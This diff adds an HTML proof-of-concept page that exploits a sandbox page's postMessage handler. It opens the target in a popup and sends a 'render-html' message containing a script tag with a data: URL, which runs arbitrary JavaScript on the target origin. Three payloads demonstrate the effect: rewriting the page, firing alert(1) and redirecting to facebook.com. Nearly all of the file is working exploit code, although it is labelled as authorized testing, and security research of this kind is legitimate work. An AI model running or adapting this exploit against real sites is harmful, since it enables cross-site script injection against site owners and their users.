@@ -1,0 +1,210 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Sandbox postMessage PoC</title>
+  <style>
+    :root {
+      color-scheme: light dark;
+      --bg: #0f172a;
+      --panel: #111827;
+      --panel-2: #1f2937;
+      --text: #f8fafc;
+      --muted: #cbd5e1;
+      --accent: #22c55e;
+      --accent-2: #38bdf8;
+      --danger: #fb7185;
+      --border: rgba(255, 255, 255, 0.12);
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font: 16px/1.5 ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background:
+        radial-gradient(circle at top left, rgba(56, 189, 248, 0.22), transparent 30%),
+        radial-gradient(circle at bottom right, rgba(34, 197, 94, 0.18), transparent 28%),
+        var(--bg);
+      color: var(--text);
+      display: grid;
+      place-items: center;
+      padding: 24px;
+    }
+
+    .card {
+      width: min(780px, 100%);
+      background: linear-gradient(180deg, rgba(255,255,255,0.04), rgba(255,255,255,0.02));
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 24px;
+      box-shadow: 0 30px 80px rgba(0, 0, 0, 0.35);
+      backdrop-filter: blur(12px);
+    }
+
+    h1 {
+      margin: 0 0 8px;
+      font-size: 28px;
+      line-height: 1.2;
+    }
+
+    p {
+      margin: 0 0 16px;
+      color: var(--muted);
+    }
+
+    label {
+      display: block;
+      margin: 16px 0 8px;
+      font-size: 14px;
+      color: var(--muted);
+    }
+
+    input {
+      width: 100%;
+      padding: 12px 14px;
+      border-radius: 12px;
+      border: 1px solid var(--border);
+      background: var(--panel);
+      color: var(--text);
+      font: inherit;
+    }
+
+    .buttons {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      margin-top: 18px;
+    }
+
+    button {
+      appearance: none;
+      border: 0;
+      border-radius: 12px;
+      padding: 12px 16px;
+      font: inherit;
+      font-weight: 600;
+      cursor: pointer;
+      color: white;
+      transition: transform 120ms ease, opacity 120ms ease;
+    }
+
+    button:hover { transform: translateY(-1px); }
+    button:active { transform: translateY(0); }
+
+    .visible { background: var(--accent); color: #052e16; }
+    .alert { background: var(--accent-2); color: #082f49; }
+    .redirect { background: var(--danger); color: #4c0519; }
+
+    .note,
+    .status {
+      margin-top: 18px;
+      padding: 14px 16px;
+      border-radius: 14px;
+      background: var(--panel);
+      border: 1px solid var(--border);
+    }
+
+    .status {
+      min-height: 56px;
+      white-space: pre-wrap;
+    }
+
+    code {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      font-size: 13px;
+    }
+  </style>
+</head>
+<body>
+  <main class="card">
+    <h1>Sandbox postMessage PoC</h1>
+    <p>
+      Authorized testing only. This file opens the target <code>/sandbox.html</code> page and sends it a
+      <code>render-html</code> message. Use the visible proof first because popup blockers sometimes suppress <code>alert()</code>.
+    </p>
+
+    <label for="target">Target sandbox URL</label>
+    <input id="target" type="url" value="https://yourdomain.com/sandbox.html">
+
+    <div class="buttons">
+      <button class="visible" id="run-visible">Show visible JS execution</button>
+      <button class="alert" id="run-alert">Trigger alert(1)</button>
+      <button class="redirect" id="run-redirect">Redirect to facebook.com</button>
+    </div>
+
+    <div class="note">
+      Expected results:
+      <br>
+      <code>Show visible JS execution</code> changes the target tab title to <code>sandbox-poc</code> and writes a message into the page.
+      <br>
+      <code>Trigger alert(1)</code> shows an alert from the target origin.
+      <br>
+      <code>Redirect to facebook.com</code> navigates the target tab away, demonstrating arbitrary script control.
+    </div>
+
+    <div class="status" id="status">Ready.</div>
+  </main>
+
+  <script>
+    const targetInput = document.getElementById('target');
+    const statusEl = document.getElementById('status');
+
+    function setStatus(message) {
+      statusEl.textContent = message;
+    }
+
+    function buildPayload(jsCode) {
+      return `<script src="data:text/javascript,${encodeURIComponent(jsCode)}"><\/script>`;
+    }
+
+    function sendPayload(html, description) {
+      const target = targetInput.value.trim();
+      if (!target) {
+        setStatus('Enter a target sandbox URL first.');
+        return;
+      }
+
+      const popup = window.open(target, '_blank');
+      if (!popup) {
+        setStatus('Popup blocked. Allow popups for this local file and try again.');
+        return;
+      }
+
+      setStatus(`Opened ${target}\nWaiting 1 second, then sending payload: ${description}`);
+
+      setTimeout(() => {
+        popup.postMessage({ type: 'render-html', html }, '*');
+        try { popup.focus(); } catch {}
+        setStatus(`Payload sent to ${target}\nDescription: ${description}`);
+      }, 1000);
+    }
+
+    document.getElementById('run-visible').addEventListener('click', () => {
+      const js = `
+        document.title = 'sandbox-poc';
+        (function wait() {
+          if (!document.body) return setTimeout(wait, 10);
+          document.body.innerHTML =
+            '<div style="font:32px sans-serif;padding:40px">' +
+            'JavaScript executed on ' + location.origin +
+            '</div>';
+        })();
+      `;
+      sendPayload(buildPayload(js), 'visible JS execution proof');
+    });
+
+    document.getElementById('run-alert').addEventListener('click', () => {
+      const js = `setTimeout(() => alert(1), 50);`;
+      sendPayload(buildPayload(js), 'alert(1)');
+    });
+
+    document.getElementById('run-redirect').addEventListener('click', () => {
+      const js = `setTimeout(() => { location.href = 'https://facebook.com'; }, 50);`;
+      sendPayload(buildPayload(js), 'redirect to facebook.com');
+    });
+  </script>
+</body>
+</html>
